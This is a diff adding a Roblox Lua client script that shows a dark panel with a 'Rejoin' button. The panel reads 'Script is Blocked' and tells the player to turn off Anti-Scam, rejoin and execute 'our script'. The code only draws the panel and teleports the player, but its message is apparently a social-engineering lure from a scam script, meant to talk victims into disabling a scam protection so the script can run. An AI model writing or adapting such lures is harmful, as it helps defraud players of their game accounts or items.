@@ -1,0 +1,51 @@
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "RejoinScreen"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Create background frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.6, 0, 0.4, 0)
+frame.Position = UDim2.new(0.2, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BackgroundTransparency = 0.2
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Create TextLabel
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 0.7, -20)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextWrapped = true
+label.Font = Enum.Font.SourceSans
+label.TextSize = 5
+label.Text = [[🚫 Script is Blocked.
+1) Turn off Anti-Scam
+2) Rejoin the game
+3) Execute our script ]] 
+label.Parent = frame
+
+-- Create Rejoin Button
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0.4, 0, 0.2, 0)
+button.Position = UDim2.new(0.3, 0, 0.75, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.SourceSansBold
+button.TextSize = 8
+button.Text = "Rejoin"
+button.Parent = frame
+
+-- Rejoin Function
+button.MouseButton1Click:Connect(function()
+	TeleportService:Teleport(game.PlaceId, player)
+end)
+
+--- this script made by jamal ---
